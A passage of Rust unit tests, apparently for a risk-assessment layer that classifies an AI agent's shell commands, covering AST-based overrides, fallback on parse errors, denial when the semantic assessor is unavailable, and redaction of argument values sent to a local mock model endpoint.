        let known_local = assessment(RiskBand::Moderate, ExposureBand::Local, "shell");
        let uncertain = assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell");
        let read = assessment(RiskBand::Low, ExposureBand::Local, "shell_ast");
        let external = assessment(RiskBand::High, ExposureBand::External, "shell_ast");
        assert!(!ast_authority_wins(&known_high, &read, ParseStatus::Parsed));
        assert!(!ast_authority_wins(
            &known_local,
            &read,
            ParseStatus::Parsed
        ));
        assert!(ast_authority_wins(&uncertain, &read, ParseStatus::Parsed));
        assert!(ast_authority_wins(
            &known_local,
            &external,
            ParseStatus::Parsed
        ));
        assert!(!ast_authority_wins(
            &uncertain,
            &read,
            ParseStatus::ParsedWithErrors
        ));
        assert!(!ast_authority_wins(
            &uncertain,
            &read,
            ParseStatus::LimitExceeded
        ));
    }

    #[test]
    fn shell_ast_authority_falls_back_on_parse_errors_and_keeps_opaque_semantics_closed() {
        set_test_shell_ast_shadow_enabled(Some(false));
        set_test_shell_ast_authority_enabled(Some(true));
        let malformed = assess_invocation(
            None,
            "exec_command",
            &json!({"cmd":"if git status --short; then"}),
            Some("inspect"),
        );
        assert_eq!(malformed.source, "shell");
        assert!(malformed.ast_semantic_request.is_some());

        let opaque = assess_invocation(
            None,
            "exec_command",
            &json!({"cmd":"private-runner --opaque-value"}),
            Some("inspect"),
        );
        assert_eq!(opaque.source, "shell_ast");
        let request = opaque.semantic_request.as_ref().unwrap();
        assert!(request.tool_name.ends_with("_ast_authority"));
        assert!(request.shell_ast_shape.is_some());
        assert!(
            !serde_json::to_string(request)
                .unwrap()
                .contains("opaque-value")
        );
        let semantic = semantic_receipt(request, SemanticAssessorStatus::Unavailable);
        let pipeline = pipeline_from_parts(opaque, semantic, true);
        assert_eq!(pipeline.resolve_effect(), ResolvedEffect::DenyUncertain);
        set_test_shell_ast_shadow_enabled(None);
        set_test_shell_ast_authority_enabled(None);
    }

    #[tokio::test]
    async fn shell_ast_shadow_features_reach_the_system_one_provider_without_source_values() {
        use axum::{Json, Router, routing::post};
        use std::sync::{Arc, Mutex};
        let (seen_sender, seen_receiver) = tokio::sync::oneshot::channel();
        let seen_sender = Arc::new(Mutex::new(Some(seen_sender)));
        let app = Router::new().route("/chat/completions", post({
            let seen_sender = seen_sender.clone();
            move |Json(body): Json<serde_json::Value>| {
                let seen_sender = seen_sender.clone();
                async move {
                    if let Some(sender) = seen_sender.lock().unwrap().take() { let _ = sender.send(body); }
                    Json(json!({"choices":[{"message":{"content":r#"{"read_only":0.01,"may_write":0.99,"reversible":0.2,"destructive":0.1,"irreversible":0.2,"external_or_account_effect":0.99}"#}}]}))
                }
            }
        }));
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let endpoint = format!("http://{}", listener.local_addr().unwrap());
        tokio::spawn(async move {
            axum::serve(listener, app).await.unwrap();
        });
        let provider = SemanticProviderConfig {
            kind: SemanticProviderKind::OpenAiCompatible,
            endpoint,
            model: "test".into(),
            bearer_token: None,
            timeout: std::time::Duration::from_secs(1),
        };

        set_test_shell_ast_shadow_enabled(Some(true));
        let assessment = assess_invocation(
            None,
            "exec_command",
            &json!({"cmd":"if git rev-parse HEAD; then git push origin never-forward-this; fi"}),
            Some("inspect"),
        );
        set_test_shell_ast_shadow_enabled(None);
        let request = assessment.ast_semantic_request.unwrap();
        let vector = assess_with_provider(&reqwest::Client::new(), &provider, &request)
            .await
            .unwrap();
        assert_eq!(vector.external_or_account_effect.get(), 0.99);
        let seen = seen_receiver.await.unwrap().to_string();
        assert!(seen.contains("shell_ast_shape"));
        assert!(seen.contains("git_write"));
        assert!(seen.contains("exec_command_ast_shadow"));
        assert!(!seen.contains("never-forward-this"));
    }
}
